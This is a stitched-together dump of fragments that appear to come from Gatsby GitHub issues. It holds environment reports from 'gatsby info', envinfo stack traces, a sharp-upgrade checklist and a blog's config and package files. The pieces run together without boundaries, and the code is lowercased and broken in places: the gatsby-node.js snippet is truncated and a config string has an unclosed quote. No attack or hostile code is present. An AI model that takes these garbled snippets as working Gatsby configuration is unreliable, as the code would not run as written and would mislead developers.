$ gatsby info --clipboard system: os: windows 10 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: yarn: 1.12.3 - d:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.5.0 - d:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.3.36 => 2.3.36 gatsby-image: 2.0.26 => 2.0.26 gatsby-plugin-catch-links: 2.0.9 => 2.0.9 gatsby-plugin-feed: 2.0.11 => 2.0.11 gatsby-plugin-google-analytics: 2.0.9 => 2.0.9 gatsby-plugin-lodash: 3.0.3 => 3.0.3 gatsby-plugin-manifest: 2.0.13 => 2.0.13 gatsby-plugin-netlify-cms: 3.0.9 => 3.0.9 gatsby-plugin-nprogress: 2.0.7 => 2.0.7 gatsby-plugin-offline: 2.0.21 => 2.0.21 gatsby-plugin-react-helmet: 3.0.5 => 3.0.5 gatsby-plugin-sass: 2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.35 => 2.0.35 gatsby-plugin-sitemap: 2.0.4 => 2.0.4 gatsby-plugin-twitter: 2.0.8 => 2.0.8 gatsby-remark-autolink-headers: 2.0.12 => 2.0.12 gatsby-remark-copy-linked-files: 2.0.8 => 2.0.8 gatsby-remark-images: 3.0.1 => 3.0.1 gatsby-remark-prismjs: 3.2.0 => 3.2.0 gatsby-remark-relative-images: ^0.2.2 => 0.2.2 gatsby-remark-responsive-iframe: 2.0.8 => 2.0.8 gatsby-source-filesystem: ^2.0.33 => 2.0.33 gatsby-transformer-remark: 2.2.0 => 2.2.0 gatsby-transformer-sharp: 2.1.10 => 2.1.10 error the system cannot find the path specified
error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:4970 - envinfo.js:1 object.copysync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:66948 - envinfo.js:1 object.t.writesync.e [as writesync] [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:48777 - envinfo.js:1 [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:46934 - envinfo.js:1 promise.all.then.e [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:46949 - util.js:16 trycatcher [npm]/[gatsby-cli]/[bluebird]/js/release/util.js:16:2 3 - promise.js:512 promise._settlepromisefromhandler [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:5 12:31 - promise.js:569 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:5 69:18 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 14:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 94:18 - promise.js:638 promise._fulfill [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 38:18 - promise_array.js:126 promisearray._resolve [npm]/[gatsby-cli]/[bluebird]/js/release/promise_arra y.js:126:19 - promise_array.js:144 promisearray._promisefulfilled [npm]/[gatsby-cli]/[bluebird]/js/release/promise_arra y.js:144:14 - promise.js:574 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:5 74:26 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 14:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 94:18 error unhandled rejection error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:4970 - envinfo.js:1 object.copysync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:66948 - envinfo.js:1 object.t.writesync.e [as writesync] [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:48777 - envinfo.js:1 [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:46934 - envinfo.js:1 promise.all.then.e [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:46949 - util.js:16 trycatcher [npm]/[gatsby-cli]/[bluebird]/js/release/util.js:16:2 3 - promise.js:512 promise._settlepromisefromhandler [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:5 12:31 - promise.js:569 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:5 69:18 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 14:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 94:18 - promise.js:638 promise._fulfill [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 38:18 - promise_array.js:126 promisearray._resolve [npm]/[gatsby-cli]/[bluebird]/js/release/promise_arra y.js:126:19 - promise_array.js:144 promisearray._promisefulfilled [npm]/[gatsby-cli]/[bluebird]/js/release/promise_arra y.js:144:14 - promise.js:574 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:5 74:26 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 14:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:6 94:18
node 12, sharp@0.21.3
### steps - [x] upgrade sharp in gatsby-plugin-sharp
- [x] upgrade sharp in gatsby-transformer-sharp
- [x] upgrade sharp in gatsby-plugin-manifest
- [x] upgrade sharp in gatsby-remark-images-contentful
- [x] add warnings in core if _our_ packages depend upon different versions of sharp the last of these is being worked on by @davidbailey00 (but if someone else wants to tackle this--more than welcome to do so!), so it'd be nice to get that in _before_ we bump the versions in the plugins to be as low-impact as possible to our end users
## related issues / prs see #13646
``` system: os: macos 10.14 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 12.1.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.103 firefox: 66.0.3 safari: 12.0 npmpackages: gatsby: ^2.3.27 => 2.3.27 gatsby-image: ^2.0.40 => 2.0.40 gatsby-plugin-manifest: ^2.0.29 => 2.0.29 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.0.35 => 2.0.35 gatsby-source-filesystem: ^2.0.31 => 2.0.31 gatsby-transformer-csv: ^2.0.8 => 2.0.8 gatsby-transformer-sharp: ^2.1.18 => 2.1.18 npmglobalpackages: gatsby-cli: 2.4.8```
``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 11.6.0 - ~/.nvm/versions/node/v11.6.0/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.5.0-next.0 - ~/.nvm/versions/node/v11.6.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 74.0.3729.108 firefox: 55.0.3 safari: 11.1.2 npmpackages: gatsby: ^2.3.32 => 2.3.32 gatsby-image: ^2.0.40 => 2.0.40 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-feed: ^2.1.1 => 2.1.1 gatsby-plugin-google-analytics: ^2.0.18 => 2.0.18 gatsby-plugin-manifest: ^2.0.29 => 2.0.29 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.35 => 2.0.35 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-remark-copy-linked-files: ^2.0.12 => 2.0.12 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.8 => 3.2.8 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-filesystem: ^2.0.32 => 2.0.32 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.18 => 2.1.18 npmglobalpackages: gatsby-cli: 2.4.17
system: os: windows 10 cpu: (16) x64 amd ryzen 7 2700 eight-core processor binaries: yarn: 1.13.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.1.0 => 2.3.31 gatsby-image: ^2.0.20 => 2.0.40 gatsby-plugin-manifest: ^2.0.9 => 2.0.29 gatsby-plugin-netlify: ^2.0.13 => 2.0.15 gatsby-plugin-netlify-cache: ^1.1.0 => 1.1.0 gatsby-plugin-offline: ^2.0.16 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.12 gatsby-plugin-react-svg: ^2.0.0 => 2.1.1 gatsby-plugin-sharp: ^2.0.14 => 2.0.35 gatsby-plugin-sitemap: ^2.0.11 => 2.0.12 gatsby-plugin-styled-components: ^3.0.4 => 3.0.7 gatsby-plugin-webpack-bundle-analyzer: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.0.8 => 2.0.32 gatsby-source-wordpress: ^3.0.25 => 3.0.57 gatsby-transformer-sharp: ^2.1.8 => 2.1.18
$ ./node_modules/.bin/gatsby info --clipboard system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i5-6300u cpu @ 2.40ghz binaries: npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.0.63 => 2.0.63 gatsby-cli: ^2.4.6 => 2.4.6 gatsby-image: ^2.0.22 => 2.0.22 gatsby-plugin-less: ^2.0.8 => 2.0.8 gatsby-plugin-react-helmet: ^3.0.4 => 3.0.4 gatsby-plugin-s3: ^0.2.5 => 0.2.5 gatsby-plugin-sharp: ^2.0.15 => 2.0.35 gatsby-plugin-sitemap: ^2.0.3 => 2.0.3 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-source-filesystem: ^2.0.11 => 2.0.11 gatsby-transformer-sharp: ^2.1.9 => 2.1.9 error the system cannot find the path specified.
latest chrome browser
@christopherbiscardi
latest stable safari version on ios and macos
``` system: os: linux 5.0 arch linux undefined cpu: (4) x64 intel(r) core(tm) i5-2520m cpu @ 2.50ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 11.13.0 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 3.7.3 - /usr/bin/python browsers: firefox: 66.0.2 npmpackages: gatsby: ^2.3.25 => 2.3.25 gatsby-image: ^2.0.39 => 2.0.39 gatsby-plugin-feed: ^2.1.1 => 2.1.1 gatsby-plugin-google-analytics: ^2.0.18 => 2.0.18 gatsby-plugin-manifest: ^2.0.29 => 2.0.29 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.35 => 2.0.35 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-remark-copy-linked-files: ^2.0.11 => 2.0.11 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.8 => 3.2.8 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-filesystem: ^2.0.29 => 2.0.29 gatsby-transformer-remark: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.1.18 => 2.1.18 npmglobalpackages: gatsby-cli: 2.5.9 gatsby: 2.0.31 ```
results of `gatsby info --clipboard`
``` system: os: macos 10.14.4 cpu: (4) x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 73.0.3683.103 firefox: 66.0.3 safari: 12.1 npmglobalpackages: gatsby-cli: 2.5.7
system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-4770k cpu @ 3.50ghz binaries: yarn: 1.10.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.3.21 => 2.3.21 gatsby-image: ^2.0.38 => 2.0.38 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-manifest: ^2.0.29 => 2.0.29 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.34 => 2.0.34 gatsby-source-filesystem: ^2.0.29 => 2.0.29 gatsby-source-wordpress: ^3.0.53 => 3.0.53 gatsby-transformer-sharp: ^2.1.18 => 2.1.18
``` system: os: macos 10.14.1 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.3.0 - /usr/local/bin/node npm: 6.1.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.103 safari: 12.0.1 npmpackages: gatsby: ^2.3.16 => 2.3.16 gatsby-image: ^2.0.37 => 2.0.37 gatsby-plugin-manifest: ^2.0.28 => 2.0.28 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.32 => 2.0.32 gatsby-source-filesystem: ^2.0.29 => 2.0.29 gatsby-transformer-remark: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.4.13
``` system: os: linux 4.4 ubuntu 16.04.3 lts (xenial xerus) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.3.48 - /bin/bash binaries: node: 11.4.0 - ~/.nvm/versions/node/v11.4.0/bin/node yarn: 1.6.0 - /usr/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v11.4.0/bin/npm languages: python: 2.7.12 - /usr/bin/python npmpackages: gatsby: 2.3.15 => 2.3.15 gatsby-image: 2.0.37 => 2.0.37 gatsby-link: 2.0.16 => 2.0.16 gatsby-plugin-react-helmet: 3.0.12 => 3.0.12 gatsby-plugin-sharp: 2.0.32 => 2.0.32 gatsby-plugin-styled-components: 3.0.7 => 3.0.7 gatsby-plugin-typescript: 2.0.12 => 2.0.12 gatsby-source-filesystem: 2.0.29 => 2.0.29 gatsby-transformer-remark: 2.3.8 => 2.3.8 gatsby-transformer-sharp: 2.1.17 => 2.1.17
system: os: macos 10.14.3 cpu: x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 11.13.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.7.0 - /usr/local/bin/npm browsers: chrome: 73.0.3683.86 firefox: 66.0.1 safari: 12.0.3 npmpackages: gatsby: ^2.3.11 => 2.3.11 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-netlify: ^2.0.13 => 2.0.13 gatsby-plugin-nprogress: ^2.0.10 => 2.0.10 gatsby-plugin-react-helmet: ^3.0.11 => 3.0.11 gatsby-plugin-typography: ^2.2.10 => 2.2.10 gatsby-remark-autolink-headers: ^2.0.16 => 2.0.16 gatsby-remark-copy-linked-files: ^2.0.11 => 2.0.11 gatsby-remark-prismjs: ^3.2.6 => 3.2.6 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-transformer-json: ^2.1.11 => 2.1.11 gatsby-transformer-remark: ^2.3.8 => 2.3.8 gatsby-transformer-toml: 2.1.8 => 2.1.8 gatsby-transformer-yaml: ^2.1.11 => 2.1.11 npmglobalpackages: gatsby-cli: 1.1.58
system: os: windows 10 cpu: (16) x64 amd ryzen 7 2700 eight-core processor binaries: yarn: 1.13.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.1.0 => 2.2.6 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-netlify-cache: ^1.1.0 => 1.1.0 gatsby-plugin-offline: ^2.0.16 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-react-svg: ^2.0.0 => 2.0.0 gatsby-plugin-sharp: ^2.0.14 => 2.0.16 gatsby-plugin-sitemap: ^2.0.11 => 2.0.11 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-source-filesystem: ^2.0.8 => 2.0.12 gatsby-source-wordpress: ^3.0.25 => 3.0.25 gatsby-transformer-sharp: ^2.1.8 => 2.1.9
system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-4720hq cpu @ 2.60ghz binaries: npm: 6.5.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.10 - /c/python27/python browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.2.3 => 2.2.3 gatsby-image: ^2.0.34 => 2.0.34 gatsby-plugin-feed: ^2.0.15 => 2.0.15 gatsby-plugin-google-analytics: ^2.0.17 => 2.0.17 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.10 => 3.0.10 gatsby-plugin-sharp: ^2.0.30 => 2.0.30 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-plugin-typography: ^2.2.10 => 2.2.10 gatsby-remark-copy-linked-files: ^2.0.11 => 2.0.11 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.6 => 3.2.6 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-filesystem: ^2.0.27 => 2.0.27 gatsby-source-google-sheets: ^1.1.1 => 1.1.1 gatsby-transformer-remark: ^2.3.7 => 2.3.7 gatsby-transformer-sharp: ^2.1.17 => 2.1.17
system: os: macos 10.14.2 shell: 3.0.2 - /usr/local/bin/fish binaries: node: 10.15.3 - ~/.asdf/installs/nodejs/10.15.3/bin/node npmpackages: gatsby: ^2.3.3 => 2.3.3 gatsby-image: ^2.0.35 => 2.0.35 gatsby-plugin-manifest: ^2.0.26 => 2.0.26 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-postcss: ^2.0.7 => 2.0.7 gatsby-plugin-react-helmet: ^3.0.11 => 3.0.11 gatsby-plugin-sharp: ^2.0.32 => 2.0.32 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.5.4
+ npx gatsby info system: os: linux 4.4 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (36) x64 intel(r) xeon(r) platinum 8124m cpu @ 3.00ghz shell: 4.4.12 - /bin/bash binaries: node: 11.9.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.5.0 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python
gatsby 2.1.23
windows 10 command not recognized
### screenshots
![gatsby-sm-firefox](
![gatsby-sm-chrome](
``` system: os: macos 10.14.4 cpu: (4) x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.0 - /usr/local/bin/node yarn: 1.15.2 - ~/.yarn/bin/yarn npm: 6.7.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.86 firefox: 66.0.2 safari: 12.1 npmpackages: gatsby: ^2.3.3 => 2.3.3 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-source-meetup: ^0.0.1 => 0.0.1 gatsby-transformer-json: ^2.1.11 => 2.1.11 npmglobalpackages: gatsby-cli: 2.5.4
system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.86 safari: 12.0.3 npmpackages: gatsby: ^2.3.4 => 2.3.4 gatsby-image: ^2.0.35 => 2.0.35 gatsby-plugin-manifest: ^2.0.26 => 2.0.26 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-prefetch-google-fonts: ^1.4.1 => 1.4.1 gatsby-plugin-prismic-preview: ^2.0.0 => 2.0.0 gatsby-plugin-react-helmet: ^3.0.11 => 3.0.11 gatsby-plugin-sharp: ^2.0.32 => 2.0.32 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-remark-prettier: ^1.0.0 => 1.0.0 gatsby-source-custom-api: ^0.1.1 => 0.1.1 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-source-graphql: ^2.0.15 => 2.0.15 gatsby-source-prismic-graphql: ^3.0.2 => 3.0.2 gatsby-source-prismic-rich-text-fields: ^1.0.0 => 1.0.0 gatsby-source-shopify-min: github:olliejt/gatsby-source-shopify-min#master => 2.0.24 gatsby-transformer-remark: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.4.14
- firefox 66 - chrome 73 ### proposal - add cropping behavior option
- add additional option for cropping, instead of using `maxwidth` and `maxheight`
- update docs #11851
ping @thebigredgeek on company slack
system: os: macos 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.6.2 - /usr/local/bin/zsh binaries: node: 8.12.0 - /usr/local/bin/node yarn: 1.15.2 - ~/.yarn/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 73.0.3683.86 firefox: 65.0 safari: 12.0.3 npmpackages: gatsby: ^2.2.13 => 2.2.13 gatsby-image: ^2.0.33 => 2.0.34 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-prefetch-google-fonts: ^1.4.0 => 1.4.0 gatsby-plugin-react-helmet: ^3.0.11 => 3.0.11 gatsby-plugin-sharp: ^2.0.31 => 2.0.31 gatsby-plugin-typography: ^2.2.10 => 2.2.10 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.4.11
``` system: os: macos 10.14.4 cpu: (4) x64 intel(r) core(tm) i5-6360u cpu @ 2.00ghz shell: 5.3 - /bin/zsh binaries: node: 11.12.0 - ~/.nvm/versions/node/v11.12.0/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v11.12.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.86 firefox: 66.0.1 safari: 12.1 npmpackages: gatsby: ^2.3.2 => 2.3.2 gatsby-plugin-canonical-urls: ^2.0.12 => 2.0.12 gatsby-plugin-feed: ^2.1.0 => 2.1.0 gatsby-plugin-google-analytics: ^2.0.18 => 2.0.18 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-netlify: ^2.0.13 => 2.0.13 gatsby-plugin-netlify-cache: ^1.1.0 => 1.1.0 gatsby-plugin-netlify-cms: ^3.0.17 => 3.0.17 gatsby-plugin-nprogress: ^2.0.10 => 2.0.10 gatsby-plugin-react-helmet: ^3.0.11 => 3.0.11 gatsby-plugin-robots-txt: ^1.4.0 => 1.4.0 gatsby-plugin-sitemap: ^2.0.10 => 2.0.10 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-plugin-typescript: ^2.0.11 => 2.0.11 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-transformer-remark: ^2.3.8 => 2.3.8
(if relevant) ``` system: os: macos high sierra 10.13.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 11.6.0 - ~/.nvm/versions/node/v11.6.0/bin/node npm: 6.9.0 - ~/.nvm/versions/node/v11.6.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.86 firefox: 65.0.2 safari: 12.0.3 npmpackages: gatsby: ^2.1.31 => 2.1.37 gatsby-cli: ^2.4.16 => 2.4.16 gatsby-image: ^2.0.33 => 2.0.34 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.9 => 3.0.10 gatsby-plugin-sharp: ^2.0.28 => 2.0.29 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-remark-prismjs: ^3.2.5 => 3.2.5 gatsby-source-filesystem: ^2.0.24 => 2.0.27 gatsby-transformer-remark: ^2.3.4 => 2.3.4 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.4.17
``` ### file contents (if changed) gatsby-config.js ```
module.exports = { sitemetadata: { title: 'title', description: 'desc, author: 'alan shortis', }, plugins: [ 'gatsby-plugin-react-helmet', 'gatsby-plugin-styled-components', '@danbruegge/gatsby-plugin-stylelint', { resolve: 'gatsby-transformer-remark', options: { plugins: [ { resolve: 'gatsby-remark-prismjs', }, ], }, }, { resolve: 'gatsby-source-filesystem', options: { path: `${__dirname}/src/posts`, name: 'posts', }, }, ],
``` gatsby-node.js ```
const path = require('path'); exports.createpages = ({ graphql, actions }) => { const { createpage } = actions; return new promise(resolve => { graphql(` { allmarkdownremark { edges { node { frontmatter { slug } } } } } `).then(results => { results.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: node.frontmatter.slug, component: path.resolve('./src/components/post.js'), context: { slug: node.frontmatter.slug, }, }); }); }); resolve(); });
package.json ```
{ "name": "short.is", "private": true, "description": "alan shortis is a web developer", "version": "2.0.0", "author": "alan shortis", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "start": "npm run develop", "serve": "gatsby serve", "lint:js": "eslint \'src/**/*.js\'", "lint:style": "stylelint \'src/**/*.js\'" }, "repository": { "type": "git", "url": " " }, "husky": { "hooks": { "pre-commit": "lint-staged" } }, "lint-staged": { "*.js": [ "npm run lint:js", "npm run lint:style" ] }, "dependencies": { "babel-plugin-styled-components": "^1.10.0", "gatsby": "^2.1.31", "gatsby-cli": "^2.4.16", "gatsby-image": "^2.0.33", "gatsby-plugin-manifest": "^2.0.24", "gatsby-plugin-offline": "^2.0.25", "gatsby-plugin-react-helmet": "^3.0.9", "gatsby-plugin-sharp": "^2.0.28", "gatsby-plugin-styled-components": "^3.0.7", "gatsby-remark-prismjs": "^3.2.5", "gatsby-source-filesystem": "^2.0.24", "gatsby-transformer-remark": "^2.3.4", "gatsby-transformer-sharp": "^2.1.17", "prismjs": "^1.15.0", "prop-types": "^15.7.2", "react": "^16.8.4", "react-dom": "^16.8.4", "react-helmet": "^5.2.0", "react-html-parser": "^2.0.2", "styled-components": "^4.1.3" }, "devdependencies": { "@danbruegge/gatsby-plugin-stylelint": "^3.4.0", "eslint": "^5.3.0", "eslint-config-airbnb": "^17.1.0", "eslint-config-prettier": "^4.1.0", "eslint-plugin-import": "^2.16.0", "eslint-plugin-jsx-a11y": "^6.2.1", "eslint-plugin-prettier": "^3.0.1", "eslint-plugin-react": "^7.12.4", "husky": "^1.3.1", "lint-staged": "^8.1.5", "prettier": "^1.16.4", "stylelint": "^9.10.1", "stylelint-config-recommended": "^2.1.0", "stylelint-config-styled-components": "^0.1.1", "stylelint-processor-styled-components": "^1.5.2" }
(if relevant)
``` npmpackages: gatsby: ^2.0.76 => 2.0.117 gatsby-image: ^2.0.20 => 2.0.29 gatsby-plugin-favicon: ^3.1.5 => 3.1.5 gatsby-plugin-google-analytics: ^2.0.9 => 2.0.13 gatsby-plugin-manifest: ^2.0.9 => 2.0.17 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.6 gatsby-plugin-sharp: ^2.0.14 => 2.0.20 gatsby-source-drupal: ^3.0.15 => 3.0.23 gatsby-source-filesystem: ^2.0.23 => 2.0.23 gatsby-transformer-sharp: ^2.1.8 => 2.1.13 npmglobalpackages: gatsby-cli: 2.4.8
system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.10.0 - ~/.nvm/versions/node/v10.10.0/bin/node yarn: 1.13.0 - ~/.nvm/versions/node/v10.10.0/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.10.0/bin/npm browsers: chrome: 73.0.3683.86 firefox: 62.0.3 safari: 12.0 npmpackages: gatsby: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-source-contentful: ^2.0.42 => 2.0.42 gatsby-transformer-remark: ^2.1.7 => 2.1.7 npmglobalpackages: gatsby-cli: 2.4.3
node: v8.11.2
gatsby: v2.4.17 contents of `gatsby-config.js`: ```javascript
module.exports = { sitemetadata: { title: `gatsby default starter`, description: `kick off your next, great gatsby project with this default starter
